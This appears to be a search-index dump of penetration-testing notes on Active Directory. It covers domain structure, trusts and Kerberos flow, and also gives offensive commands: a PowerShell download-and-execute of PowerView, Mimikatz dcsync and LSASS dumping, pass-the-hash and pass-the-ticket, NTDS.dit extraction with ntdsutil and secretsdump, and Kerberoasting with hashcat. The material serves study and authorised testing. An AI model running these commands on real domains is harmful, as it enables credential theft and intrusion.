Directory replication Stores the hierarchy of objects that are used by the Knowledge Consistency Checker ( KCC ) to effect the replication topology Some of the objects located in: NTDS Site Settings objects , subnet objects , connection objects , server objects , and site objects (one site object for each site in the forest) Hierarchy is displayed as the contents of the Sites container, which is a child of the Configuration container https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10 ) Schema - Defines objects and attributes Query and index mechanism - Ability to search and publish objects and properties Global Catalog - Contains info about every object in directory Replication Service - Distributes information across domain controller Kerberos v5 used from Windows Server 2000+ Naming conventions User Principal name: DN (Distinguished Names) LDAP names: CN=winsaafman,DC=corp,DC=scriptdotsh,DC=local CN = Common name OU = Organisational Unit DC = Domain powershell . exe - exec Bypass - C \u201c IEX ( New - Object Net . WebClient ) . DownloadString ( \u2018 https : // raw . githubusercontent . com / PowerShellMafia / PowerSploit / master / Recon / PowerView . ps1 \u2019 ) ;Get-NetDomain\u201d AD Trust Types Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png Trust Type Property Trust Direction Auth. Details Tree-Root Transitive Two-way Kerberos V5 or NTLM Created automatically when a new Tree is added to a forest. Parent-Child Transitive Two-way Kerberos V5 or NTLM Created automatically when a child domain is added. Shortcut Transitive One-way or Two-way Kerberos V5 or NTLM Created Manually. Used in a forest to shorten the trust path to improve authentication times. Forest Transitive One-way or Two-way Kerberos V5 or NTLM Created Manually. Used to share resources between AD DS forests. Kerberos Process Across Trust Boundaries Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png A client from Domain 1 wants to access the server located in Domain 2. A client from Domain1 requests a TGT from the DC1. DC1 responds back with the TGT (encrypted with krbtgt hash) Client shows the TGT and requests a TGS for accessing the server in Domain2. As DC1 doesn\u2019t find the server in current domain and realizes that the TGS needs to be issued by the DC2 (of Domain2) because the server is located in the Domain2. So it responds back to client with the Inter-realm TGT. Client shows the TGT encrypted with Inter-Realm trust key to DC2 in the Domain2 and requests TGS to access the server. DC2 sends back the TGS for Server encrypted with server\u2019s account hash. Client presents the TGS (encrypted with server\u2019s account hash) to the server for access. Scope of Authentication Forest-wide authentication - Users from the outside forest have the same level of access to resources in the local forest as users who belong to the local forest. Selective authentication - You need to manually assign permissions on each computer in the domain as well as the resources to which you want users in the second forest to have access (by editing ACE (Access control entry)). Setup Install - windowsfeature AD - domain - services Install - WindowsFeature RSAT - ADDS Import - Module ADDSDeployment Install - ADDSForest - CreateDnsDelegation : $ false ` - DatabasePath C:\\Windows\\NTDS ` - DomainMode Win2012R2 ` - DomainName server1.hacklab.local ` - DomainNetbiosName server1 ` - ForestMode Win2012R2 ` - InstallDns : $ true ` - LogPath C:\\Windows\\NTDS ` - NoRebootOnCompletion : $ false ` - SysvolPath C:\\Windows\\SYSVOL ` - Force : $ true Download VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ SysPrep When and How: https://thesolving.com/server-room/when-and-how-to-use-sysprep/ Add user net user user1 Passw0rd ! / ADD / DOMAIN New - ADUser - Name Winsaaf Man - DisplayName Winsaaf Man - SamAccountName \u201c winsaaf . man \u201d - UserPrincipalName \u201c winsaaf . man @scriptdotsh . local \u201d - GivenName \u201c winsaaf \u201d - Surname man - AccountPassword ( Read - host - AsSecureString \u201c Enter Password \u201d ) - Enabled $ true - server scriptdotsh . local More options: - ChangePasswordAtLogon $ false - PasswordNeverExpires $ true Bulk addition: https://gallery.technet.microsoft.com/office/Create-Contoso-Users-in-3e2f38f2/view/Discussions View users: net users / domain View group: net group / domain Domain Admins Detect Firewall Blocking AD PortQryUI - http://www.microsoft.com/download/en/details.aspx?id=24009 * Run the \u201cDomains Trusts\u201d option between DCs, or between DCs and any machine * \u201cNOTLISTENING,\u201d 0x00000001, and 0x00000002, that means there is a port block * Can ignore UDP 389 and UDP 88 messages * TCP 42 errors, that just means WINS is not running on the target server https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/ Implementing Least Privilege Model https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models Attack Types Windows systems vulnerabilities. AD misconfigurations. Scanning pingcastle . exe --healthcheck --server DOMAIN_CONTROLLER_IP --user USERNAME --password PASSWORD --advanced-live --nullsession Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be Tools Mimikatz utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file lsadump :: dcsync / domain : pentestlab . local / all / csv lsadump :: dcsync / domain : pentestlab . local / user : test executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process privilege :: debug lsadump :: lsa / inject CrackMapExec Automate assessing the security of large Active Directory networks crackmapexec smb target ( s ) - u username - H LMHASH : NTHASH crackmapexec smb target ( s ) - u username - H NTHASH ldapsearch Query the Domain Controller for Active Directory UserAccountControl attributes of active accounts Other specific configurations Possible UserAccountControl values: https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro Active users (2 == disabled account status) ldapsearch - x - h $ ip - p 389 - D SVC_TGS \u200b - w \u200b$ password - b \u200b dc=active,dc=htb \u200b - s sub ( (objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))) \u200b samaccountname Impacket\u2019s GetADUsers.py Enumerate domain user accounts GetADUsers . py - all active . htb / svc_tgs - dc - ip $ ip Enumeration Using PowerShell and Built-ins Works in Constrained Mode as well. C : \\ Windows \\ Microsoft . NET \\ assembly \\ GAC_64 \\ Microsoft . ActiveDirectory . Management \\ Microsoft . ActiveDirectory . Management . dll https://github.com/winsaafman/Scriptdotsh-ActiveDirectory/raw/master/Microsoft.ActiveDirectory.Management.dll Import-Module .\\ Microsoft . ActiveDirectory . Management . dll Domain: Get - ADDomain Forest: Get - ADForest Trust: Get - ADTrust - Filter * Users: Get - ADUser - Filter * Groups : Get - ADGroup - Filter * Filter Groups for User: Get - ADGroup - Filter { Name - like *admin* } | select name , GroupScope PowerView . / PowerView . ps1 All domain computers: Get - NetComputer Domain Controller: Get - NetDomainController Groups: Get - NetGroup Sessions: Get - NetSession ACL for AD objects: Get - ObjectAcl Check if current user context has local-admin access to hosts in the domain: Find - LocalAdminAccess - Verbose Enumerate members of local-admin groups across all machines: Invoke - EnumerateLocalAdmin - Verbose Snapshot for Offline Analysis Using https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer Download: https://live.sysinternals.com/ UNC path: \\\\ live . sysinternals . com \\ tools Bloodhound Finds groups and group members of each group. Gets Domain computers in the domain. Obtain local admins for each computer. List Active sessions on each computer. And then creates relationships between all these findings. SYSVOL Ref: https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx Folder which resides on each and every domain controller within the domain . Contains the domains public files that need to be accessed by clients and kept synchronised between domain controllers. Default location is C : \\ Windows \\ SYSVOL The SYSVOL folder can be accessed through: share \\\\ domainname . com \\ sysvol or the local share name on the server \\\\ servername \\ sysvol . Uses DFS to share the relevant folders to users and clients. - Distributed File System. Client and server services that allow servers to organize distributed file shares into a distributed file system. File Replication Service - FRS is a multi-master, multi-threaded replication technology. Introduced in Windows 2000 to replace the previous LMREPL technology used in NT3.x and 4 days Ageing Cache - Detects the change by monitoring the NTFS USN journal (stored in NTFRS database) (every 3 seconds) Replaced by DFSR (Distributed File System Replication) in Windows 2008 or higher Auto-healing functions in place to remedy some of the issues that FRS Instead of replicating entire files we only replicate the chunks of data that have changed Based on MD4 hash of the file The log contains information about the file and the time it was changed, this is then used to build its change message. To ensure the file and all it\u2019s attributes (i.e. permissions) are kept intact FRS calls the backup API which uses VSS technology to take a snapshot of the file and it\u2019s attributes. This backup file is then compressed and stored in the staging area folder. At this point the outbound log is updated (again this is actually a table within the FRS database). This contains information about all the changes for a specified replication set. If in step 1 a file was deleted rather than created then we don\u2019t create a staging file, but the outbound log reflects the deletion. FRS on DC1 then sends a change notification to its replication partner DC2. DC2 adds the information about the change into its inbound log and accepts the change then sends a change acknowledgment back to DC1. DC2 then copies the file from DC1 into its staging area. It then writes an entry to its outbound log to allow other partners to pickup the change. DC2 then calls the backup API to restore the file from the staging area into the SYSVOL folder. So there you have it, FRS replication. There is a very detailed and in-depth reference guide on TechNet here for further reference. Collections Active Directory Kill Chain Attack Defense Attack Patterns Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Dumping AD Credentials secretsdump Need domain admin credentials: secretsdump . py - just - dc - ntlm DOMAIN / USER @ DOMAIN_CONTROLLER NTDS.dit AD data stored in: %SYSTEMROOT%\\NTDS\\ntds.dit Cannot be copied directly to another location Can be extracted using Domain Controller Replication Services Native Windows Binaries WMI Backups / External Storage for DC VMWare / HyperV for virtual DCs VMWare admin can call virtual DC within VMWare Clone a DC and copy the storage file No events triggered NTDSUtil DC Promo has to copy from another DC But if NTDSUtil was used to create an IMF (Install From Media), it makes a copy of NTDS.dit Can use NTDSUtil to create an IMF or look for IMF in network Extraction techniques and tools: https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ - Dumping Domain Password Hashes Steps: cmd.exe as Administrator ntdsutil snapshot activate instance NTDS create mount UUID copy NTDS.dit (located in Windows\\NTDS\\NTDS.dit by default) ntdsutil unmount UUID delete UUID quit quit reg . exe save HKLM \\ SYSTEM path_where_you_want_to_save_it secretsdump . py - system path_to_system_hive - ntds path_to_ntds . dit LOCAL Dumping Credentials on DC Take memory dump of LSASS process using task manager and use Mimikatz offline Run Mimikatz on DC Invoke-Mimikatz on DC via PS remoting Pass the Hash Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf In typical scenario: User type the password LSASS hash the password (LM, NTLM) and send it to service for authentication In attack scenario: Attacker pass the hash (LM, NTML) itself to LSASS which is sent to service Preventions Disable NTML hashes \"Protected Users\" group Do not leave lot of NTLM authentication footprint in eventless Over Pass the Hash / Pass the Key Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf If NTLM hash is available, encrypt timestamp with hash and sent it to KDC in AS-REQ to get a TGT Keys are in: Client LSASS memory Prevented by \"Protected Users\" group Active Directory NTDS.dit and SYSTEM hive Offline [Tool] NTDSXtract python DSUser . py ntds . dit . export / datatable . 4 ntds . dit . export / link_table . 7 . / work - name Administrator --syshive SYSTEM --supplcreds --passwordhashes --lmoutfile ./lm --ntoutfile ./nt --pwdformat john privilege :: debug sekurlsa :: ekeys Online privilege :: debug lsadump :: lsa / inject / name : Administrator Keys are in: DES RC4 - Non domain salted NTML hash AES128 AES256 keys (NT6+) Use PBKDF2 Salted 4096 iterations Cracking is difficult Over pass the hash privilege :: debug sekurlsa :: pth / user : Administrator / domain : DomainName / ntlm : Hash References http://www.janua.fr/active-directory-vulnerability-disclosure-weak-encryption-enables-attacker-to-change-victims-password-without-being-logged/ Pass the Ticket Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Inject the TGT in to the LSASS Kerberos Provider Do not ask the KDC for the TGT, instead ask the KDC to give us a TGS Can also inject TGS in to the LSASS Kerberos Provider Exporting from memory: API only allow exporting current user's tickets (your tickets) TGT: AllowTgtSessionKey reg-key must be set TGS: No restrictions http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx LsaCallAuthenticationPackage / KerbRetrieveEncodedTicketMessage LsaCallAuthenticationPackage / KerbSubmitTicketMessage mimikatz kerberos :: list [ / export ] mimikatz kerberos :: ptt ticket For all users in LSASS memory: privilege :: debug sekurlsa :: tickets export kerberos : ptt ticket . kirbi DCSyc Used to sync AD to Azure Can be used to get credentials from AD If reverse encryption is enabled for an account, clear text password can be obtained. Needs Administrator or Domain Controller rights By default, no logs since this is done through official RPC (remotely) Implemented by: Mimikatz (lsadump:dcsync), Impacket, DSInternals DCSync is easy to detected NRPC (NetLogon) When you have domain admin account for one DC, can as another DC to send all NTLM hashed of computer accounts and domain controller accounts. Can be used to create silver tickets. If you have rights flip some bytes of the account, can make a normal user account a workstation account. Can be used to get user accounts using this. References Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Escalating privileges with ACLs in Active Directory: https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting https://blog.stealthbits.com/impersonating-service-accounts-with-silver-tickets https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/ https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a https://blog.stealthbits.com/performing-domain-reconnaissance-using-powershell https://blog.stealthbits.com/local-admin-mapping-bloodhound https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/ https://blog.stealthbits.com/passing-the-hash-with-mimikatz https://blog.stealthbits.com/what-is-dcsync-an-introduction/ https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/ https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/ https://blog.ropnop.com/practical-usage-of-ntlm-hashes/ https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/ https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/ https://0xdarkvortex.dev/index.php/2018/08/26/active-directory-penetration-dojo-setup-of-ad-penetration-labpart-2/ https://0xdarkvortex.dev/index.php/2018/10/29/active-directory-penetration-dojo-creation-of-forest-trustpart-3/ https://www.attackdebris.com/?p=470 https://blog.didierstevens.com/2016/08/12/mimikatz-golden-ticket-dcsync/ https://adsecurity.org/?p=2362 https://pentestlab.blog/tag/ntds-dit/ http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/ http://passing-the-hash.blogspot.com/ http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html https://room362.com/post/2017/reset-ad-user-password-with-linux/ https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory: https://www.youtube.com/watch?v=JEIR5oGCwdg Azure AD Connect for Red Teamers: https://blog.xpnsec.com/azuread-connect-for-redteam/ https://github.com/hausec/PowerZure How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller: https://adsecurity.org/?p=451 Attack Methods for Gaining Domain Admin Rights in Active Directory: https://adsecurity.org/?p=2362 Mimikatz DCSync Usage, Exploitation, and Detection: https://adsecurity.org/?p=1729 How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398 Defense Active Directory Core Security Principles Best Practices: https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf Active Directory Kill Chain Attack Defense: https://github.com/infosecn1nja/AD-Attack-Defense Microsoft-Blue-Forest: https://github.com/rootsecdev/Microsoft-Blue-Forest Welcome to building your first domain controller!: https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md Pwn and Defend - Active Directory Domain Enumeration: https://www.youtube.com/watch?v=YxeXfHkHAUI feature=youtu.be KB2871997 https://technet.microsoft.com/library/security/2871997 Microsoft has definitely raised the bar: accounts that are members of the localgroup \u201cAdministrators\u201d are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it\u2019s renamed. Microsoft Windows AD Kerberos Tickets Gather tickets GetUserSPNs . py - request ( HOST . DOMAIN ) / ( VALID SMB USER ):( USER PASSWORD ) Crack - a 0 - Straight cracking mode - m 13100 - Hashtype 13100 - which is Kerberos 5 TGS - REP etype 23 the kerberos . ticket file - w 3 - Suggested example workload setting for Hashcat .\\ hashcat64 . exe - m 13100 - a 0 C:\\Users\\weaknet\\Desktop\\Portfolio\\VMWare Shared\\kerberos.tick et -w 3 C :\\ Users \\ weaknet \\ Desktop \\ Portfolio \\ VMWare Shared \\ rockyou . txt hashcat ( v5 . 1 . 0 ) starting ... Dump ldapdomaindump - u example \\ example 10 . 10 . 10 . 10","title":"Active Directory"},{"location":"os/windows/active-directory/#active-directory","text":"","title":"Active Directory"},{"location":"os/windows/active-directory/#introduction","text":"Active Directory enables centralized, secure management of an entire network, which might span a building, a city, or multiple locations throughout the world. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10 ) These antiquated AD designs only focused on the: - Directory information tree - Delegation model - Group Policy Objects (GPOs) structure and accounts management Securing privileged access - Active Directory administrative tier model: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material","title":"Introduction"},{"location":"os/windows/active-directory/#components","text":"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10 ) Component Description Organizational Units Container object Used to arrange other objects Easier to locate and manage Can delegate the authority to manage Can be nested in other organizational units Domains Container object Collection of administratively defined objects that share a common directory database, security policies, and trust relationships with other domains Each domain is an administrative boundary for objects. A single domain can span multiple physical locations or sites Domain Trees Collections of domains that are grouped together in hierarchical structures When you add a domain to a tree, it becomes a child of the tree root domain The domain to which a child domain is attached is called the parent domain. A child domain might in turn have its own child domain. The name of a child domain is combined with the name of its parent domain to form its own unique Domain Name System (DNS) name such as Corp.nwtraders.msft. .:. a tree has a contiguous namespace. Forests Instance of Active Directory Each forest acts as a top-level container in that it houses all domain containers for that particular Active Directory instance A forest can contain one or more domain container objects, all of which share a common logical structure, global catalog, directory schema, and directory configuration, as well as automatic two-way transitive trust relationships. The first domain in the forest is called the forest root domain . The name of that domain refers to the forest, such as Nwtraders.msft. By default, information in Active Directory is shared only within the forest. .:. the forest is a security boundary for the information that is contained in that instance of Active Directory Site Objects Leaf and container objects Topmost object in the hierarchy of objects that are used to manage and implement Active Directory replication Stores the hierarchy of objects that are used by the Knowledge Consistency Checker ( KCC ) to effect the replication topology Some of the objects located in: NTDS Site Settings objects , subnet objects , connection objects , server objects , and site objects (one site object for each site in the forest) Hierarchy is displayed as the contents of the Sites container, which is a child of the Configuration container https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10 ) Schema - Defines objects and attributes Query and index mechanism - Ability to search and publish objects and properties Global Catalog - Contains info about every object in directory Replication Service - Distributes information across domain controller Kerberos v5 used from Windows Server 2000+ Naming conventions User Principal name: DN (Distinguished Names) LDAP names: CN=winsaafman,DC=corp,DC=scriptdotsh,DC=local CN = Common name OU = Organisational Unit DC = Domain powershell . exe - exec Bypass - C \u201c IEX ( New - Object Net . WebClient ) . DownloadString ( \u2018 https : // raw . githubusercontent . com / PowerShellMafia / PowerSploit / master / Recon / PowerView . ps1 \u2019 ) ;Get-NetDomain\u201d","title":"Components"},{"location":"os/windows/active-directory/#ad-trust-types","text":"Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png Trust Type Property Trust Direction Auth. Details Tree-Root Transitive Two-way Kerberos V5 or NTLM Created automatically when a new Tree is added to a forest. Parent-Child Transitive Two-way Kerberos V5 or NTLM Created automatically when a child domain is added. Shortcut Transitive One-way or Two-way Kerberos V5 or NTLM Created Manually. Used in a forest to shorten the trust path to improve authentication times. Forest Transitive One-way or Two-way Kerberos V5 or NTLM Created Manually. Used to share resources between AD DS forests.","title":"AD Trust Types"},{"location":"os/windows/active-directory/#kerberos-process-across-trust-boundaries","text":"Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png A client from Domain 1 wants to access the server located in Domain 2. A client from Domain1 requests a TGT from the DC1. DC1 responds back with the TGT (encrypted with krbtgt hash) Client shows the TGT and requests a TGS for accessing the server in Domain2. As DC1 doesn\u2019t find the server in current domain and realizes that the TGS needs to be issued by the DC2 (of Domain2) because the server is located in the Domain2. So it responds back to client with the Inter-realm TGT. Client shows the TGT encrypted with Inter-Realm trust key to DC2 in the Domain2 and requests TGS to access the server. DC2 sends back the TGS for Server encrypted with server\u2019s account hash. Client presents the TGS (encrypted with server\u2019s account hash) to the server for access. Scope of Authentication Forest-wide authentication - Users from the outside forest have the same level of access to resources in the local forest as users who belong to the local forest. Selective authentication - You need to manually assign permissions on each computer in the domain as well as the resources to which you want users in the second forest to have access (by editing ACE (Access control entry)).","title":"Kerberos Process Across Trust Boundaries"},{"location":"os/windows/active-directory/#setup","text":"Install - windowsfeature AD - domain - services Install - WindowsFeature RSAT - ADDS Import - Module ADDSDeployment Install - ADDSForest - CreateDnsDelegation : $ false ` - DatabasePath C:\\Windows\\NTDS ` - DomainMode Win2012R2 ` - DomainName server1.hacklab.local ` - DomainNetbiosName server1 ` - ForestMode Win2012R2 ` - InstallDns : $ true ` - LogPath C:\\Windows\\NTDS ` - NoRebootOnCompletion : $ false ` - SysvolPath C:\\Windows\\SYSVOL ` - Force : $ true Download VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ SysPrep When and How: https://thesolving.com/server-room/when-and-how-to-use-sysprep/ Add user net user user1 Passw0rd ! / ADD / DOMAIN New - ADUser - Name Winsaaf Man - DisplayName Winsaaf Man - SamAccountName \u201c winsaaf . man \u201d - UserPrincipalName \u201c winsaaf . man @scriptdotsh . local \u201d - GivenName \u201c winsaaf \u201d - Surname man - AccountPassword ( Read - host - AsSecureString \u201c Enter Password \u201d ) - Enabled $ true - server scriptdotsh . local More options: - ChangePasswordAtLogon $ false - PasswordNeverExpires $ true Bulk addition: https://gallery.technet.microsoft.com/office/Create-Contoso-Users-in-3e2f38f2/view/Discussions View users: net users / domain View group: net group / domain Domain Admins","title":"Setup"},{"location":"os/windows/active-directory/#detect-firewall-blocking-ad","text":"PortQryUI - http://www.microsoft.com/download/en/details.aspx?id=24009 * Run the \u201cDomains Trusts\u201d option between DCs, or between DCs and any machine * \u201cNOTLISTENING,\u201d 0x00000001, and 0x00000002, that means there is a port block * Can ignore UDP 389 and UDP 88 messages * TCP 42 errors, that just means WINS is not running on the target server https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/","title":"Detect Firewall Blocking AD"},{"location":"os/windows/active-directory/#implementing-least-privilege-model","text":"https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models","title":"Implementing Least Privilege Model"},{"location":"os/windows/active-directory/#attack-types","text":"Windows systems vulnerabilities. AD misconfigurations.","title":"Attack Types"},{"location":"os/windows/active-directory/#scanning","text":"pingcastle . exe --healthcheck --server DOMAIN_CONTROLLER_IP --user USERNAME --password PASSWORD --advanced-live --nullsession Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be","title":"Scanning"},{"location":"os/windows/active-directory/#tools","text":"","title":"Tools"},{"location":"os/windows/active-directory/#mimikatz","text":"utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file lsadump :: dcsync / domain : pentestlab . local / all / csv lsadump :: dcsync / domain : pentestlab . local / user : test executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process privilege :: debug lsadump :: lsa / inject","title":"Mimikatz"},{"location":"os/windows/active-directory/#crackmapexec","text":"Automate assessing the security of large Active Directory networks crackmapexec smb target ( s ) - u username - H LMHASH : NTHASH crackmapexec smb target ( s ) - u username - H NTHASH","title":"CrackMapExec"},{"location":"os/windows/active-directory/#ldapsearch","text":"Query the Domain Controller for Active Directory UserAccountControl attributes of active accounts Other specific configurations Possible UserAccountControl values: https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro Active users (2 == disabled account status) ldapsearch - x - h $ ip - p 389 - D SVC_TGS \u200b - w \u200b$ password - b \u200b dc=active,dc=htb \u200b - s sub ( (objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))) \u200b samaccountname","title":"ldapsearch"},{"location":"os/windows/active-directory/#impackets-getaduserspy","text":"Enumerate domain user accounts GetADUsers . py - all active . htb / svc_tgs - dc - ip $ ip","title":"Impacket\u2019s GetADUsers.py"},{"location":"os/windows/active-directory/#enumeration","text":"","title":"Enumeration"},{"location":"os/windows/active-directory/#using-powershell-and-built-ins","text":"Works in Constrained Mode as well. C : \\ Windows \\ Microsoft . NET \\ assembly \\ GAC_64 \\ Microsoft . ActiveDirectory . Management \\ Microsoft . ActiveDirectory . Management . dll https://github.com/winsaafman/Scriptdotsh-ActiveDirectory/raw/master/Microsoft.ActiveDirectory.Management.dll Import-Module .\\ Microsoft . ActiveDirectory . Management . dll Domain: Get - ADDomain Forest: Get - ADForest Trust: Get - ADTrust - Filter * Users: Get - ADUser - Filter * Groups : Get - ADGroup - Filter * Filter Groups for User: Get - ADGroup - Filter { Name - like *admin* } | select name , GroupScope","title":"Using PowerShell and Built-ins"},{"location":"os/windows/active-directory/#powerview","text":". / PowerView . ps1 All domain computers: Get - NetComputer Domain Controller: Get - NetDomainController Groups: Get - NetGroup Sessions: Get - NetSession ACL for AD objects: Get - ObjectAcl Check if current user context has local-admin access to hosts in the domain: Find - LocalAdminAccess - Verbose Enumerate members of local-admin groups across all machines: Invoke - EnumerateLocalAdmin - Verbose","title":"PowerView"},{"location":"os/windows/active-directory/#snapshot-for-offline-analysis","text":"Using https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer Download: https://live.sysinternals.com/ UNC path: \\\\ live . sysinternals . com \\ tools","title":"Snapshot for Offline Analysis"},{"location":"os/windows/active-directory/#bloodhound","text":"Finds groups and group members of each group. Gets Domain computers in the domain. Obtain local admins for each computer. List Active sessions on each computer. And then creates relationships between all these findings.","title":"Bloodhound"},{"location":"os/windows/active-directory/#sysvol","text":"Ref: https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx Folder which resides on each and every domain controller within the domain . Contains the domains public files that need to be accessed by clients and kept synchronised between domain controllers. Default location is C : \\ Windows \\ SYSVOL The SYSVOL folder can be accessed through: share \\\\ domainname . com \\ sysvol or the local share name on the server \\\\ servername \\ sysvol . Uses DFS to share the relevant folders to users and clients. - Distributed File System. Client and server services that allow servers to organize distributed file shares into a distributed file system. File Replication Service - FRS is a multi-master, multi-threaded replication technology. Introduced in Windows 2000 to replace the previous LMREPL technology used in NT3.x and 4 days Ageing Cache - Detects the change by monitoring the NTFS USN journal (stored in NTFRS database) (every 3 seconds) Replaced by DFSR (Distributed File System Replication) in Windows 2008 or higher Auto-healing functions in place to remedy some of the issues that FRS Instead of replicating entire files we only replicate the chunks of data that have changed Based on MD4 hash of the file The log contains information about the file and the time it was changed, this is then used to build its change message. To ensure the file and all it\u2019s attributes (i.e. permissions) are kept intact FRS calls the backup API which uses VSS technology to take a snapshot of the file and it\u2019s attributes. This backup file is then compressed and stored in the staging area folder. At this point the outbound log is updated (again this is actually a table within the FRS database). This contains information about all the changes for a specified replication set. If in step 1 a file was deleted rather than created then we don\u2019t create a staging file, but the outbound log reflects the deletion. FRS on DC1 then sends a change notification to its replication partner DC2. DC2 adds the information about the change into its inbound log and accepts the change then sends a change acknowledgment back to DC1. DC2 then copies the file from DC1 into its staging area. It then writes an entry to its outbound log to allow other partners to pickup the change. DC2 then calls the backup API to restore the file from the staging area into the SYSVOL folder. So there you have it, FRS replication. There is a very detailed and in-depth reference guide on TechNet here for further reference.","title":"SYSVOL"},{"location":"os/windows/active-directory/#collections","text":"Active Directory Kill Chain Attack Defense","title":"Collections"},{"location":"os/windows/active-directory/#attack-patterns","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf","title":"Attack Patterns"},{"location":"os/windows/active-directory/#dumping-ad-credentials","text":"","title":"Dumping AD Credentials"},{"location":"os/windows/active-directory/#secretsdump","text":"Need domain admin credentials: secretsdump . py - just - dc - ntlm DOMAIN / USER @ DOMAIN_CONTROLLER","title":"secretsdump"},{"location":"os/windows/active-directory/#ntdsdit","text":"AD data stored in: %SYSTEMROOT%\\NTDS\\ntds.dit Cannot be copied directly to another location Can be extracted using Domain Controller Replication Services Native Windows Binaries WMI Backups / External Storage for DC VMWare / HyperV for virtual DCs VMWare admin can call virtual DC within VMWare Clone a DC and copy the storage file No events triggered NTDSUtil DC Promo has to copy from another DC But if NTDSUtil was used to create an IMF (Install From Media), it makes a copy of NTDS.dit Can use NTDSUtil to create an IMF or look for IMF in network Extraction techniques and tools: https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ - Dumping Domain Password Hashes Steps: cmd.exe as Administrator ntdsutil snapshot activate instance NTDS create mount UUID copy NTDS.dit (located in Windows\\NTDS\\NTDS.dit by default) ntdsutil unmount UUID delete UUID quit quit reg . exe save HKLM \\ SYSTEM path_where_you_want_to_save_it secretsdump . py - system path_to_system_hive - ntds path_to_ntds . dit LOCAL","title":"NTDS.dit"},{"location":"os/windows/active-directory/#dumping-credentials-on-dc","text":"Take memory dump of LSASS process using task manager and use Mimikatz offline Run Mimikatz on DC Invoke-Mimikatz on DC via PS 